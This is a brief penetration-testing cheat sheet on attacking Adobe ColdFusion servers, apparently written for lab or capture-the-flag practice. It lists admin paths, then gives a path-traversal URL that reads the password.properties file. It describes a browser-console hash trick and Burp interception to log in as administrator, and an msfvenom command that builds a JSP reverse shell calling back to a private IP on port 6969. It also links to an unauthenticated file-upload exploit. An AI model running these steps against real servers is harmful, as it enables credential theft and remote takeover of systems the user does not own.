# coldfusion

## Interesting Stuff

```
# identification folders
/CFIDE
/cfdocs

# admin page
/CFIDE/administrator/index.cfm
```

## Admin Page bypass

```
Using https://www.exploit-db.com/exploits/14641
IP/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

Using console > console.log(hex_hmac_sha1(document.loginform.salt.value, '<hash>'));
Using Burp to intercept and using `<console-hash>` as new password.
```

## Upload Shell using GUI

```
Under Debugging & Logging > Scheduled Tasks > Create new task
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.146 LPORT=6969 -o shell.jsp
```

## Arbitary File Upload (unauthenticated)

v8.0.1

```
https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload
```
